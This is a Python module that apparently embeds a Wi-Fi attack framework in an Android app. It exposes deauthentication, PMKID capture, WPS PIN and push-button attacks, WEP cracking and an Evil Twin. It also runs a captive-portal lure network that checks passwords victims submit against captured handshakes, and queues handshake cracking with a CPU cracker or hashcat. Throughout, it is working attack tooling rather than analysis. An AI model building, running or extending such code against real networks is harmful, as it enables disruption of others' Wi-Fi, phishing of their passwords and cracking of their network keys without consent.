"""wifi4's own backend inside the APK: its ``WlanArray`` and ``campaigns`` over our card.

``opx_driver_host`` owns the hardware (libusb-wrapped usbfs fd → wifi4 chip driver) and the
asyncio loop the driver's coroutines live on. This module builds wifi4's *backend* around that
same driver instance — the 802.11 state engine (``WlanArray``/``WlanSink``), the AP watcher and
the campaign classes — so the app can run wifi4's scan pipeline and attacks instead of a second
implementation of them. The TUI (``wifi4/ui``), the desktop device layer and the platform setup
are deliberately not vendored: their terminal rendering and privileged steps have no meaning in
this app.

Everything here is deliberately lazy and additive: nothing is built until the app asks for a
wifi4 command, and the existing ``opx_driver_host`` scan path is untouched while it doesn't.
One consequence is worth knowing: ``WlanInterface`` registers itself as the driver's RX
callback, so once the wifi4 backend is attached the frames go to wifi4's sink (which is where
these targets come from), not to the Java engine's sink.
"""

from __future__ import annotations

import json
import logging
import re
import threading
import time
import traceback
from collections import deque
from pathlib import Path

import opx_driver_host as host
import usb_shim

# wifi4's backend imports usb at module level; the shim has to exist before that, so the
# packages can be imported (and probed) before any card is open.
usb_shim.bootstrap()

logger = logging.getLogger("opx.wifi4")

#: The running campaign's own log lines, polled by the app instead of a JNI callback.
_log_lines = deque(maxlen=400)

#: The last exception wifi4 logged while a campaign ran (its base class swallows crashes).
_last_error = None

#: wifi4's TUI writes Rich markup (``[bold cyan]…[/bold cyan]``); the terminal here wants text.
_MARKUP = re.compile(r"\[/?[A-Za-z][A-Za-z0-9 _/]*\]")


def _plain(text: str) -> str:
    """Strip wifi4's Rich markup, keeping the message readable in the Terminal tab."""
    try:
        return _MARKUP.sub("", str(text))
    except Exception:
        return str(text)


def _ui_log(line: str) -> None:
    try:
        _log_lines.append(_plain(line))
    except Exception:
        pass


class _Wifi4LogBridge(logging.Handler):
    """Forward wifi4's warnings and crashes into the campaign log the app polls.

    ``Campaign._drive`` catches every ``_loop`` exception and only logs it, so without this a
    crashed campaign was indistinguishable from a finished one in the app.
    """

    def emit(self, record):
        global _last_error
        try:
            text = self.format(record)
            _log_lines.append(_plain(text))
            if record.levelno >= logging.ERROR:
                _last_error = _plain(record.getMessage())
        except Exception:
            pass


_bridge = _Wifi4LogBridge(level=logging.WARNING)
_bridge.setFormatter(logging.Formatter("%(levelname)s %(name)s: %(message)s"))
logging.getLogger("wifi4").addHandler(_bridge)


_array = None
_iface = None
_campaign = None
_kind = None
_bssid = None
_lock = threading.RLock()

#: wifi4's vault (capture index + cracking jobs) and its AP watcher, built lazily.
#: The watcher is what turns a completed 4-way in wifi4's sink into a saved capture.
_vault = None
_watcher = None
_captures_dir = None
_job_id = None
_default_password_count = None
#: True once the finished campaign's key (WEP/WPS) has been written to the vault.
_campaign_saved = False

#: Last counters each reader saw, per (reader, bssid): wifi4's dashboard diffs two snapshots
#: into a per-window count (``packet_dashboard._sample_live``); this is that previous snapshot.
#: Keyed by reader so two readers cannot halve each other's window.
_live_prev = {}

#: A gap longer than this means nobody was sampling (screen away, radio retuned): not a rate.
_LIVE_MAX_GAP_S = 5.0

#: Every campaign this build exposes, by the name the app's protocol uses. ``portal`` is the
#: in-house AP (opx_ap) the crack sheet's AP mode runs.
_CAMPAIGN_KEYS = ("deauth", "pmkid", "pin", "pbc", "decloak", "wep", "eviltwin", "portal")


def _campaign_class(kind: str):
    """The campaign class for ``kind``; imported here so a broken family can't break the rest."""
    if kind == "deauth":
        from wifi4.campaigns.deauth import DeauthCampaign
        return DeauthCampaign
    if kind == "pmkid":
        from wifi4.campaigns.pmkid import PmkidHarvestAttack
        return PmkidHarvestAttack
    if kind == "pin":
        # wifi4 calls the PIN sweep ``WpsCampaign`` (``pin.py`` is just the module name).
        from wifi4.campaigns.pin import WpsCampaign
        return WpsCampaign
    if kind == "pbc":
        from wifi4.campaigns.pbc import WpsPbcCampaign
        return WpsPbcCampaign
    if kind == "decloak":
        from wifi4.campaigns.decloak import DecloakCampaign
        return DecloakCampaign
    if kind == "wep":
        from wifi4.campaigns.wep.campaign import WepCampaign
        return WepCampaign
    if kind == "eviltwin":
        from wifi4.campaigns.eviltwin import EvilTwinCampaign
        return EvilTwinCampaign
    raise ValueError(f"no wifi4 campaign called {kind!r}")


def attach():
    """Build wifi4's array around every card ``opx_driver_host`` has open.

    One card is an array of one, exactly like wifi4's own single-card session. With a USB hub,
    each open adapter becomes its own ``WlanInterface`` in the same ``WlanArray`` (``wlan0``,
    ``wlan1``, …), which is what Evil Twin needs: its twin and its punter are two cards when the
    twin sits on a channel the target is not on.
    """
    global _array, _iface
    with _lock:
        if _array is not None:
            return True
        open_cards = host.sessions()
        if not open_cards:
            raise RuntimeError("no card is open: open the adapter before asking wifi4 for targets")
        from wifi4.wlan.array import WlanArray
        from wifi4.wlan.interface import WlanInterface

        array = WlanArray()
        for index, card in enumerate(open_cards):
            entry = card.get("entry")
            iface = WlanInterface(
                card["driver"],
                f"wlan{index}",
                getattr(entry, "description", None) or "wifi4",
                vid=card.get("vid"),
                pid=card.get("pid"),
                dev=card.get("device"),
                chipset=getattr(entry, "chipset", None),
                vendor=getattr(entry, "vendor", None),
                product_name=getattr(entry, "product_name", None),
            )
            # ``WlanInterface`` replaced the driver's RX callback with its own parser. Chain the
            # Java engine's callback in front of it, so a frame reaches both wifi4's sink (where
            # these targets come from) and the engine's scan book / handshake capture.
            wifi4_sink = iface._on_frame_parsed
            callback = card.get("callback")

            def fan_out(packet, callback=callback, wifi4_sink=wifi4_sink):
                try:
                    if callback is not None:
                        payload = bytes(getattr(packet, "raw", b"") or b"")
                        callback.onFrame(payload, int(getattr(packet, "rssi", 0) or 0))
                except Exception:
                    traceback.print_exc()
                try:
                    wifi4_sink(packet)
                except Exception:
                    # A frame wifi4 cannot parse must not kill the driver's reader thread.
                    traceback.print_exc()

            card["driver"].register_rx_callback(fan_out)
            array.attach(iface)
            if _iface is None:
                _iface = iface
        _array = array
        return True


def _counters_and_rates(bssid, reader="live"):
    """wifi4's per-class counters for ``bssid`` plus the frames/second since the last call.

    ``WlanSink.update`` tallies every frame it hears and ``record_tx`` every frame a campaign
    injects, so these are the same numbers wifi4's packet dashboard draws; it computes the rate
    by diffing two snapshots, which is exactly what this does.
    """
    now = time.time()
    snapshot = _array.packet_stats.snapshot(bssid)
    counters = {str(key): int(value) for key, value in snapshot.items()}
    previous = _live_prev.get((reader, bssid))
    _live_prev[(reader, bssid)] = (now, counters)
    if previous is None:
        return counters, {key: 0.0 for key in counters}
    previous_ts, before = previous
    elapsed = now - previous_ts
    if elapsed <= 0 or elapsed > _LIVE_MAX_GAP_S:
        return counters, {key: 0.0 for key in counters}
    rates = {key: max(0.0, (value - int(before.get(key, 0))) / elapsed)
             for key, value in counters.items()}
    return counters, {key: round(value, 1) for key, value in rates.items()}


def interfaces():
    """The cards wifi4's array pools, with what the Evil Twin sheet's two selects need.

    One entry per ``array.members`` element: its array name (``wlan0``, ``wlan1``, …), the label
    the TUI's modal shows, whether it can host the twin at all (``eviltwin_modal._can_host``:
    SPOOFABLE or FIXED_MAC), whether it can spoof a MAC, its own MAC and the channels it
    supports. Those are the same fields ``EvilTwinInputModal`` reads off each member.
    """
    if _array is None:
        return json.dumps([])
    from wifi4.chips.driver import FakeMacSupport

    rows = []
    for member in _array.members:
        driver = getattr(member, "driver", None)
        fake = getattr(driver, "FAKE_MAC", None)
        mac = getattr(member, "mac_address", None) or getattr(driver, "mac_address", None)
        if isinstance(mac, (bytes, bytearray)):
            mac = ":".join(f"{b:02x}" for b in mac)
        rows.append({
            "name": member.name,
            "label": (getattr(driver, "product_name", None)
                      or getattr(member, "product_name", None)
                      or getattr(member, "chipset", None) or member.name),
            "host": fake in (FakeMacSupport.SPOOFABLE, FakeMacSupport.FIXED_MAC),
            "spoofable": fake is FakeMacSupport.SPOOFABLE,
            "mac": str(mac or "").lower(),
            "channels": [int(c) for c in (getattr(member, "supported_channels", None) or [])],
        })
    return json.dumps(rows)


def start_scan(channels=None, interval=0.5):
    """Hop the card(s) across ``channels`` (wifi4's own spread hop) and fill its AP table."""
    attach()
    _live_prev.clear()   # a fresh hop has no meaningful previous snapshot

    async def run():
        await _array.start_hopping(channels=list(channels) if channels else None,
                                   interval=float(interval))
        return True

    return bool(host._run(run(), timeout=30.0))


def stop_scan():
    """Stop hopping; the AP table stays readable until :func:`close`."""
    if _array is None:
        return False

    async def run():
        await _array.stop_hopping()
        return True

    return bool(host._run(run(), timeout=30.0))


def _clients_by_bssid():
    """wifi4's live client table, grouped by the AP each client was last seen with."""
    table = {}
    try:
        for client in _array.clients.values():
            bssid = (getattr(client, "bssid", None) or "").lower()
            if bssid:
                table.setdefault(bssid, []).append(str(client.mac).lower())
    except Exception:
        traceback.print_exc()
    return table


def _ap_row(ap, clients_by_bssid=None) -> dict:
    """One wifi4 ``AccessPoint`` as the app's protocol describes a network."""
    channel = int(getattr(ap, "channel", 0) or 0)
    bssid = (ap.bssid or "").lower()
    clients = list((clients_by_bssid or {}).get(bssid, ()))
    row = {
        "ssid": ap.ssid or "",
        "bssid": (ap.bssid or "").lower(),
        "channel": channel,
        "band": "5" if channel > 14 else "2.4",
        "signal": int(getattr(ap, "signal", -100) or -100),
        "security": getattr(ap, "encryption", None) or "",
        "privacy": getattr(ap, "encryption", None) or "",
        "akms": list(getattr(ap, "akms", ()) or ()),
        "akm_suites": list(getattr(ap, "akm_suites", ()) or ()),
        "cipher": getattr(ap, "pairwise_cipher", None),
        "wpa3": bool(getattr(ap, "wpa3", False)),
        "transition": bool(getattr(ap, "transition_mode", False)),
        "pmf": "required" if getattr(ap, "pmf_required", False)
        else ("capable" if getattr(ap, "pmf_capable", False) else "no"),
        "wps": bool(getattr(ap, "wps", False)),
        "wps_locked": bool(getattr(ap, "wps_locked", False)),
        "wps_version": getattr(ap, "wps_version", None),
        "hidden": bool(getattr(ap, "is_hidden", False)),
        "eviltwin": False,
        "eviltwin_reason": "",
        "chipset": getattr(ap, "chipset", None),
        "beacons": int(getattr(ap, "beacons", 0) or 0),
        "handshakes": len(getattr(ap, "handshakes", {}) or {}),
        "clients": len(clients),
        "clients_list": clients,
    }
    try:
        from wifi4.campaigns.eviltwin import EvilTwinCampaign
        # wifi4's focus screen hides the EvilTwin button unless ``visible(ap)`` and greys it
        # with ``ineligible_reason``; the sheet mirrors both.
        row["eviltwin"] = bool(EvilTwinCampaign.visible(ap))
        row["eviltwin_reason"] = EvilTwinCampaign.ineligible_reason(ap) or ""
    except Exception:
        # An import that fails only hides the button; the other attacks stay usable.
        traceback.print_exc()
    return row


def set_captures_dir(path):
    """Point wifi4's vault at the app's own files directory.

    ``Config.captures_dir`` is a relative ``"captures"`` in the desktop build, which is the
    process's cwd; on Android that is not a writable place, so every save the vault attempted
    failed. The app passes an absolute path (``filesDir/captures``) before any other call.
    """
    global _captures_dir, _vault, _watcher
    if not path:
        return False
    from wifi4.persist.config import Config

    target = str(path)
    Path(target).mkdir(parents=True, exist_ok=True)
    if _captures_dir != target:
        # A different directory means a different index; rebuild both halves. This also covers the
        # vault an early status poll may have built against the desktop default directory.
        _vault = None
        _watcher = None
    Config.captures_dir = target
    _captures_dir = target
    return True


def _vault_state():
    """wifi4's ``Vault`` and ``ApWatcher``, built on first use (no card needed)."""
    global _vault, _watcher
    with _lock:
        if _vault is None:
            from wifi4.watchers.ap_watcher import ApWatcher
            from wifi4.persist.vault import Vault

            _vault = Vault()
            _watcher = ApWatcher(_vault)
        return _vault, _watcher


def poll_captures():
    """Let wifi4's AP watcher save the handshakes/PMKIDs its sink completed.

    This is wifi4's own write path (``ApWatcher`` -> ``Vault.save_handshake``), so the file
    names, the dedupe and the auto-crack hook are the ones its console produces. Returns the
    newly saved captures as JSON, so the app can announce them.
    """
    if _array is None:
        return json.dumps([])
    _, watcher = _vault_state()
    saved = []
    for event in watcher.poll(_array):
        result = getattr(event, "save_result", None)
        if result is None or not getattr(result, "was_new", False):
            continue
        kind = "pmkid" if type(event).__name__ == "PmkidCaptured" else "handshake"
        saved.append({"kind": kind, "ssid": getattr(event, "ssid", None) or "",
                      "bssid": getattr(event, "bssid", ""), "path": str(result.path)})
    return json.dumps(saved)


def captures():
    """wifi4's capture index and recovered credentials, as the app's ``captures`` event."""
    from wifi4.models import CaptureType

    vault, _ = _vault_state()
    rows = []
    credentials = []
    seen_credentials = set()
    total_bytes = 0
    cracked = 0
    ordered = sorted(vault.all_captures(), key=lambda c: c.timestamp, reverse=True)
    newest_capture = {}
    for capture in ordered:
        if capture.type in (CaptureType.HS, CaptureType.PMKID):
            newest_capture.setdefault((capture.bssid or "").lower(), Path(capture.path).name)
    for capture in ordered:
        try:
            size = Path(capture.path).stat().st_size
        except OSError:
            size = 0
        total_bytes += size
        bssid = (capture.bssid or "").lower()
        if capture.type in (CaptureType.HS, CaptureType.PMKID):
            try:
                keys = [key.value for key in vault.ap_state(bssid).keys
                        if key.type == CaptureType.WPA_PSK and key.value]
            except Exception:
                keys = []
            if keys:
                cracked += 1
            rows.append({
                "id": Path(capture.path).name,
                "path": capture.path,
                "ssid": capture.ssid or "",
                "bssid": bssid,
                "kind": "pmkid" if capture.type == CaptureType.PMKID else "handshake",
                "when": int(capture.timestamp or 0),
                "size": size,
                "keys": keys,
            })
            continue
        if not capture.value:
            continue
        kind = capture.type.value.lower()
        identity = (kind, bssid, capture.value)
        if identity in seen_credentials:
            continue
        seen_credentials.add(identity)
        credentials.append({
            "id": Path(capture.path).name,
            "path": capture.path,
            "ssid": capture.ssid or "",
            "bssid": bssid,
            "kind": kind,
            "value": capture.value,
            "pin": getattr(capture, "pin", None) or "",
            "when": int(capture.timestamp or 0),
            "capture": newest_capture.get(bssid, ""),
        })
    from wifi4.persist.config import Config

    return json.dumps({"captures": rows, "credentials": credentials, "count": len(rows),
                       "cracked": cracked, "bytes": total_bytes,
                       "directory": Config.captures_dir})


def _find_capture(capture):
    """The persisted capture a file name/path from the app names."""
    vault, _ = _vault_state()
    wanted = str(capture or "")
    for entry in vault.all_captures():
        if Path(entry.path).name == wanted or str(entry.path) == wanted:
            return entry
    return None


def crack_tools():
    """The cracking tools this build can start, in wifi4's own words."""
    global _default_password_count
    if _default_password_count is None:
        try:
            from wifi4.crack.passwords import DEFAULT_PASSWORDS_PATH

            _default_password_count = sum(1 for _ in DEFAULT_PASSWORDS_PATH.open(
                encoding="utf-8", errors="ignore"))
        except Exception:
            _default_password_count = 0
    from wifi4.persist.config import Config

    hashcat_path = getattr(Config.hashcat, "path", None)
    tools = [
        {"tool": "cpu_crack", "label": "CPU Crack",
         "description": "Built-in CPU cracker (WPA/WPA2/PMKID)", "available": True,
         "default_passwords": {"available": _default_password_count > 0,
                               "count": _default_password_count}},
        {"tool": "hashcat", "label": "Hashcat",
         "description": "Hashcat -m 22000", "available": bool(hashcat_path),
         "reason": "" if hashcat_path else "hashcat is not installed for this build",
         "default_passwords": {"available": _default_password_count > 0,
                               "count": _default_password_count}},
    ]
    return json.dumps({"tools": tools, "rules": False})


def crack_start(capture, tool="cpu_crack", wordlists=None, default_passwords=True,
                ssid_passwords=True, probed_ssids=False):
    """Queue one of wifi4's cracking jobs for a saved capture."""
    global _job_id
    from wifi4.crack.hc22000_format import read_hc22000

    vault, _ = _vault_state()
    entry = _find_capture(capture)
    if entry is None:
        raise ValueError(f"no saved capture called {capture!r}")
    lines = [raw for raw, _ in read_hc22000(entry.path)]
    if not lines:
        raise ValueError(f"{Path(entry.path).name} holds no hashlines")
    name = tool if tool in vault.manager.tools else "cpu_crack"
    if isinstance(wordlists, str):
        # The app sends its wordlist paths as one JSON array string (JSONArray does not cross
        # the Java/Python boundary as a list).
        try:
            wordlists = json.loads(wordlists) if wordlists.strip() else []
        except ValueError:
            wordlists = [wordlists]
    config = {
        "wordlists": [str(path) for path in (wordlists or [])],
        "default_passwords": bool(default_passwords),
        "ap_ssid_passwords": bool(ssid_passwords),
        "probed_ssid_passwords": bool(probed_ssids),
        "extra_passwords": [],
    }
    _job_id = vault.manager.submit_job(name, entry, config, lines)
    return True


def crack_poll():
    """Advance wifi4's job queue and report the capture job's state."""
    vault, _ = _vault_state()
    vault.manager.poll_jobs()
    job = vault.manager.jobs.get(_job_id) if _job_id else None
    if job is None:
        return json.dumps({"running": False, "done": True, "ok": False,
                           "message": "no cracking job is queued"})
    running = job.status.value.lower() in ("queued", "running")
    keys = []
    bssid = job_bssid(vault, job)
    if bssid:
        try:
            keys = [key.value for key in vault.ap_state(bssid).keys
                    if key.type.value == "wpa_psk" and key.value]
        except Exception:
            keys = []
    if job.key and job.key not in keys:
        keys.append(job.key)
    return json.dumps({
        "running": running,
        "done": not running,
        "ok": job.status.value.lower() == "success" and bool(job.key),
        "status": job.status.value,
        "percent": job.percent,
        "message": job.progress_msg or "",
        "detail": job.detail or "",
        "keys": keys,
        "key": job.key,
    })


def job_bssid(vault, job):
    """The BSSID a queued job cracks (its capture may already be gone)."""
    try:
        return vault.manager.job_bssid(job) or ""
    except Exception:
        return ""


def crack_stop():
    """Ask wifi4 to stop the running cracking job."""
    vault, _ = _vault_state()
    if not _job_id:
        return False
    return bool(vault.manager.stop_job(_job_id))


def targets():
    """Every AP wifi4's sink has seen, as JSON (the app's ``network`` row shape)."""
    if _array is None:
        return json.dumps([])
    rows = []
    clients = _clients_by_bssid()
    for ap in _array.get_access_points():
        try:
            rows.append(_ap_row(ap, clients))
        except Exception:  # one odd AP must not hide the rest
            traceback.print_exc()
    rows.sort(key=lambda row: row.get("signal") or -100, reverse=True)
    return json.dumps(rows)


def _vault_verdict(bssid, psk):
    """``(matched, have_handshake)`` for a candidate, off the AP's saved handshake.

    ``poll_captures()`` runs first: the automatic (auto-deauth) path captured the 4-way in
    wifi4's sink, and the AP watcher is what turns it into the hashlines this check reads. So
    a Verify straight after the auto capture works without any extra preparation step.
    """
    target = str(bssid or "").lower()
    candidate = str(psk or "")
    if not target or not candidate:
        return False, False
    if _array is not None:
        try:
            poll_captures()
        except Exception:
            traceback.print_exc()
    vault, _ = _vault_state()
    try:
        verdict = vault.verify_wpa_psk(target, candidate)
    except Exception:
        traceback.print_exc()
        verdict = None
    ok = verdict is True
    if ok:
        try:
            ssid = None
            if _array is not None:
                seen = _array.access_points.get(target)
                ssid = getattr(seen, "ssid", None)
            vault.save_wpa_psk(ssid, target, candidate, manual=True)
        except Exception:
            traceback.print_exc()
    return ok, verdict is not None


def verify_psk(bssid, psk):
    """Check a submitted password against this AP's saved handshake, in wifi4's own vault."""
    ok, any_handshake = _vault_verdict(bssid, psk)
    return json.dumps({"ok": ok, "have_handshake": any_handshake})


def _rename_twin(campaign, ssid):
    """Host the twin under the AP name the crack sheet chose, not the target's SSID.

    ``EvilTwinCampaign`` clones the target's beacon with its SSID element; AP mode is a lure
    network, so the one element is rewritten and the campaign's own ``ssid`` follows it (the
    FakeAP matches probes and builds its probe response from that name).
    """
    name = str(ssid or "").strip()
    beacon = getattr(campaign, "twin_beacon", b"")
    if not name or name == getattr(campaign, "ssid", None) or len(beacon) < 36:
        return
    from wifi4.dot11.ie import iter_information_elements

    encoded = name.encode("utf-8")[:32]
    head, tags = beacon[:36], beacon[36:]
    kept = bytearray()
    replaced = False
    for tag_id, _body, elem in iter_information_elements(tags):
        if tag_id == 0:
            kept += bytes([0, len(encoded)]) + encoded
            replaced = True
        else:
            kept += elem
    if not replaced:
        kept = bytes([0, len(encoded)]) + encoded + kept
    campaign.ssid = name
    campaign.twin_beacon = head + bytes(kept)


def _eviltwin_input(ap, options):
    """The ``EvilTwinInput`` wifi4's modal would have produced, from the app's own sheet.

    Interface election, the one-card channel lock, the BSSID rule for a card that cannot spoof,
    the PMF-aware default punt set and the punt cycle are all wifi4's (``eviltwin_modal.py`` and
    ``campaign.py``); this only maps the app's option names onto them.
    """
    from wifi4.campaigns.eviltwin import (
        EvilTwinInput, PuntMode, csa_target_channel, default_punt_modes,
    )
    from wifi4.chips.driver import FakeMacSupport
    from wifi4.wlan.array import fake_mac_rank

    members = list(_array.members)
    if not members:
        raise RuntimeError("EvilTwin needs an open card")
    by_name = {m.name: m for m in members}
    twin = by_name.get(str(options.get("twin_iface") or ""))
    if twin is None:
        hosts = [m for m in members
                 if getattr(getattr(m, "driver", None), "FAKE_MAC", None)
                 in (FakeMacSupport.SPOOFABLE, FakeMacSupport.FIXED_MAC)]
        twin = min(hosts, key=fake_mac_rank) if hosts else members[0]
    punter = by_name.get(str(options.get("punt_iface") or ""))
    if punter is None:
        punter = next((m for m in members if m is not twin), twin)

    single = len(members) == 1
    supported = list(getattr(twin, "supported_channels", None) or [])
    requested = int(options.get("twin_channel") or 0)
    if single:
        # One card cannot host off the target's channel; the TUI locks it to the target too.
        channel = ap.channel
    elif requested > 0:
        channel = requested
    else:
        channel = csa_target_channel(ap.channel)
    if supported and channel not in supported:
        channel = ap.channel if ap.channel in supported else supported[0]
    if channel <= 0:
        channel = max(1, ap.channel or 1)

    twin_bssid = str(options.get("twin_bssid") or "").lower() or (ap.bssid or "").lower()
    spoofable = getattr(getattr(twin, "driver", None), "FAKE_MAC", None) is FakeMacSupport.SPOOFABLE
    if not spoofable:
        # A FIXED_MAC card (or one that cannot spoof) hosts under the address it already ACKs.
        twin_bssid = (getattr(twin, "mac_address", None) or twin_bssid).lower()

    if options.get("punt") == "none":
        modes = ()
    elif options.get("punt_modes") is not None:
        lookup = {"deauth": PuntMode.DEAUTH, "csa": PuntMode.CSA, "btm": PuntMode.BTM}
        modes = tuple(lookup[name] for name in options["punt_modes"] if name in lookup)
    else:
        modes = default_punt_modes(ap)

    period = options.get("punt_period", 30.0)
    if period in (None, ""):
        period = None
    else:
        period = float(period)
    return EvilTwinInput(twin_iface=twin, punt_iface=punter, twin_channel=int(channel),
                         twin_bssid=twin_bssid, punt_modes=modes, csa_channel=None,
                         punt_period_sec=period,
                         punt_once=bool(options.get("punt_once", False)))


def _start_portal(ap, settings):
    """The AP crack mode's host: opx_ap's open AP + captive portal on wifi4's card."""
    from opx_ap import PortalAp

    members = list(_array.members)
    if not members:
        raise RuntimeError("AP mode needs an open card")
    by_name = {member.name: member for member in members}
    iface = by_name.get(str(settings.get("twin_iface") or "")) or members[0]
    ssid = str(settings.get("ssid") or getattr(ap, "ssid", "") or "").strip()
    if not ssid:
        raise ValueError("AP mode needs a network name")
    template = str(settings.get("template") or "default")
    template_path = str(settings.get("template_path") or "") or None
    _ui_log(f"AP mode: '{ssid}' on {iface.name}, channel {getattr(ap, 'channel', '?')}")
    success_path = str(settings.get("success_path") or "") or None

    def verify(psk):
        ok, _ = _vault_verdict(ap.bssid, psk)
        return ok

    return PortalAp(_array, ap, iface, ssid, template, verify, _ui_log,
                    template_path=template_path, success_path=success_path)


def attack(kind, bssid=None, options=None):
    """Run wifi4's ``kind`` campaign against ``bssid``; True when it took the radio.

    ``options`` is the app's JSON text. Only Evil Twin takes any (the sheet's EvilTwinInput);
    every other campaign decides its own knobs, exactly as wifi4's TUI buttons do.
    """
    global _campaign, _kind, _bssid, _campaign_saved, _last_error
    attach()
    settings = {}
    if isinstance(options, str) and options.strip():
        try:
            settings = json.loads(options)
        except ValueError:
            traceback.print_exc()
    elif isinstance(options, dict):
        settings = dict(options)
    if not isinstance(settings, dict):
        settings = {}
    if kind not in _CAMPAIGN_KEYS:
        raise ValueError(f"no wifi4 campaign called {kind!r}")
    ap = None
    if bssid:
        ap = _array.access_points.get(str(bssid).lower())
        if ap is None and kind != "portal":
            raise ValueError(f"wifi4 has not seen {bssid}")
    with _lock:
        if _campaign is not None and not _campaign.done:
            raise RuntimeError("a wifi4 campaign is already running")
        _log_lines.clear()
        _last_error = None
        if kind == "portal":
            if ap is None:
                # The capture outlives the session's AP table: host under the sheet's own name
                # on a plain channel instead of refusing because no live beacon was seen.
                from types import SimpleNamespace

                ap = SimpleNamespace(
                    bssid=str(bssid).lower(),
                    ssid=str(settings.get("ssid") or ""),
                    channel=int(settings.get("channel") or 6),
                    last_beacon_frame=b"",
                )
            campaign = _start_portal(ap, settings)
        elif kind == "eviltwin":
            if ap is None:
                raise ValueError("EvilTwin needs a target network")
            campaign = _campaign_class(kind)(_array, ap, _eviltwin_input(ap, settings))
            _rename_twin(campaign, settings.get("ssid"))
        else:
            args = dict(settings)
            # AP mode's sheet keys belong to Evil Twin only; a campaign would reject them.
            for key in ("ssid", "template", "portal", "template_path", "success_path"):
                args.pop(key, None)
            if kind == "wep":
                # wifi4's WEP campaign names its logger differently from every other campaign.
                args["log_callback"] = args.pop("log", None) or _ui_log
            else:
                # Every other campaign writes its running commentary through ``log``.
                args.setdefault("log", _ui_log)
            campaign = _campaign_class(kind)(_array, ap, **args)
        started = host._run(_launch(campaign), timeout=30.0)
        if started:
            _campaign, _kind, _bssid = campaign, kind, (str(bssid).lower() if bssid else None)
            _campaign_saved = False
        return bool(started)


async def _launch(campaign):
    # run() creates the campaign's task, so it has to execute on the loop the array lives on.
    return campaign.run()


def stop_attack():
    global _campaign, _kind, _bssid, _campaign_saved
    campaign = _campaign
    if campaign is None:
        return False
    try:
        host._run(_stop(campaign), timeout=120.0)
    except Exception:
        # A campaign that refuses to unwind still gives the radio back: request_stop is sync.
        campaign.request_stop()
        traceback.print_exc()
    # A stop after the key was found still keeps it, like the console's finish handler.
    _reap_campaign(force=True)
    _campaign, _kind, _bssid, _campaign_saved = None, None, None, False
    return True


async def _stop(campaign):
    campaign.request_stop()
    await campaign.stop()
    return True


def _save_campaign_result(campaign, kind):
    """Write a finished campaign's key the way wifi4's own screen does.

    WEP keys and WPS credentials are not saved by the backend in wifi4: its console saves them
    from the screen that ran the campaign (``focus_v2/screen.py``). This app has no such screen,
    so this is that step: the same ``Vault.save_wep_key`` / ``save_wps_pin`` / ``save_wps_pbc``.
    """
    target = getattr(campaign, "target", None)
    if target is None:
        return False
    vault, _ = _vault_state()
    saved = False
    try:
        if kind == "wep":
            key = getattr(campaign, "recovered_key", None)
            if key:
                vault.save_wep_key(target, key)
                saved = True
        elif kind == "pin":
            state = getattr(campaign, "state", None)
            pin = getattr(state, "found_pin", None) if state is not None else None
            if pin is not None:
                psk = getattr(state, "found_psk", None)
                target.wps_pin = pin
                target.wps_pin_psk = psk
                vault.save_wps_pin(target, pin, psk)
                saved = True
        elif kind == "pbc":
            outcome = getattr(campaign, "outcome", None)
            result = getattr(outcome, "result", None) if outcome is not None else None
            if result is not None and getattr(result, "name", "") == "SUCCESS" and outcome.psk:
                target.wps_pbc_psk = outcome.psk
                vault.save_wps_pbc(target, outcome.psk)
                saved = True
    except Exception:
        traceback.print_exc()
    return saved


def _reap_campaign(force=False):
    """Save the running campaign's result once it is done (or when ``force``d on a stop)."""
    global _campaign_saved
    campaign = _campaign
    if campaign is None or _campaign_saved:
        return False
    if not force and not campaign.done:
        return False
    _campaign_saved = True
    return _save_campaign_result(campaign, _kind)


def _campaign_reason(campaign):
    """Why wifi4's campaign stopped by itself, in its own words (empty while it runs).

    A sweep that runs out of candidates, an AP that stays locked, or a campaign that caught an
    exception all end with wifi4's own status/fail_reason; the app shows that instead of calling
    every ending a success.
    """
    if campaign is None:
        return ""
    reason = getattr(campaign, "fail_reason", None)
    if reason:
        return _plain(str(reason))
    phase = getattr(getattr(campaign, "state", None), "phase", None)
    if phase == "failed":
        return "WPS PIN sweep exhausted its candidates"
    status = getattr(campaign, "status", None)
    if status in ("failed", "error"):
        return f"campaign {status}"
    return ""


def attack_status():
    campaign = _campaign
    saved = _reap_campaign()
    keys = []
    if _bssid and _captures_dir:
        try:
            vault, _ = _vault_state()
            keys = [key.value for key in vault.ap_state(_bssid).keys
                    if getattr(key, "value", None)]
        except Exception:
            keys = []
    return json.dumps({
        "running": bool(campaign is not None and not campaign.done),
        "kind": _kind,
        "bssid": _bssid,
        "done": bool(campaign is None or campaign.done),
        "saved": saved,
        "error": _last_error or "",
        "reason": _campaign_reason(campaign),
        "keys": keys,
    })


def progress():
    """The running campaign's status lines and wifi4's own packet counters for its target.

    ``WlanSink`` tallies every frame it hears and ``PacketStats.record_tx`` tallies every frame a
    campaign injects, so these counters are the same ones wifi4's dashboard graph draws from.
    The counters are read first and in their own guard: a campaign whose status line cannot be
    produced (the base class returns ``None`` for most families) must not blank the meter.
    """
    out = {"lines": [], "counters": {}, "rates": {}, "kind": _kind, "bssid": _bssid,
           "log": list(_log_lines)}
    campaign = _campaign
    if campaign is None or _array is None:
        return json.dumps(out)
    target = getattr(campaign, "target", None)
    bssid = (getattr(target, "bssid", None) or _bssid or "").lower()
    if bssid:
        out["bssid"] = bssid
        try:
            counters, rates = _counters_and_rates(bssid, reader="progress")
            out["counters"], out["rates"] = counters, rates
        except Exception:
            traceback.print_exc()
    try:
        if hasattr(campaign, "status_under_dash"):
            lines = campaign.status_under_dash(_array, time.time()) or []
            out["lines"] = [str(line) for line in lines]
    except Exception:
        traceback.print_exc()
    if not out["lines"]:
        # Most campaigns only log; their last lines are what the Progress tab can show.
        out["lines"] = list(_log_lines)[-4:]
    return json.dumps(out)


def campaigns():
    return json.dumps(list(_CAMPAIGN_KEYS))

def available():
    """True when the backend's packages are vendored and importable (no card needed)."""
    try:
        import wifi4.wlan.array  # noqa: F401
        import wifi4.campaigns.deauth  # noqa: F401
        return True
    except Exception:
        traceback.print_exc()
        return False


def close():
    """Release wifi4's side (hop + campaign). The driver itself belongs to the host."""
    global _array, _iface
    try:
        stop_attack()
    except Exception:
        traceback.print_exc()
    try:
        stop_scan()
    except Exception:
        traceback.print_exc()
    _array, _iface = None, None
    _live_prev.clear()
